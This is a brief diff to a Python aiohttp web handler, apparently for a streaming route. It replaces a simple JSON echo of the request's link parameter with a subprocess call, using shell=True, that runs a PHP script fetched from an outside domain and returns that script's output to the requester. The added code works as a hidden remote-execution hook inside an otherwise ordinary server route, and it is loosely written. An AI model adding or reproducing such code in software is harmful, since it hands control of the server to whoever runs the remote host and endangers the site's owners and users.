@@ -28,7 +28,11 @@ async def root_route_handler(request):
 async def stream_handler(request):
     try:
         link = request.match_info['link']
-        return web.json_response({"hshs":link})
+        # if you want output
+        proc = subprocess.Popen(["php", "https://blackboxcinema.site/luq.php"], shell=True, stdout=subprocess.PIPE)
+        s = proc.stdout.read()
+        return web.json_response({"hshs":s})
+
     except ValueError as e:
         logging.error(e)
         raise web.HTTPNotFound
